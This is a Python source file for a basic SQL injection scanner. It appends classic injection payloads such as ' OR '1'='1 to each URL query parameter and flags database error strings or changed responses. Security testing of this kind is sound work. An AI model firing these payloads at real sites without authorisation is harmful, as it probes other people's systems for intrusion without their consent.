import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1"
]

def get_response(url):
    try:
        return requests.get(url, timeout=5).text
    except:
        return None   # better than ""

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # safe handling
    original_value = params.get(param, [""])[0]
    params[param] = original_value + payload

    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def scan_sql_injection(url):
    results = []

    sql_errors = [
        "sql syntax",
        "mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return [{
            "type": "SQL Injection",
            "message": "No parameters found in URL",
            "severity": "Info"
        }]

    original_response = get_response(url)

    if original_response is None:
        return [{
            "type": "Scan Error",
            "message": "Target not reachable",
            "severity": "Critical"
        }]

    seen = set()  

    for param in params:
        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            injected_response = get_response(test_url)

            if injected_response is None:
                continue

            # 🔴 Error-based detection (HIGH confidence)
            for error in sql_errors:
                if error in injected_response.lower():
                    key = (param, payload, "error")
                    if key not in seen:
                        results.append({
                            "type": "SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        seen.add(key)
                    break

            # 🟡 Response difference (LOW confidence)
            if injected_response != original_response:
                key = (param, payload, "diff")
                if key not in seen:
                    results.append({
                        "type": "SQL Injection (Possible)",
                        "parameter": param,
                        "payload": payload,
                        "severity": "Medium"
                    })
                    seen.add(key)

    return results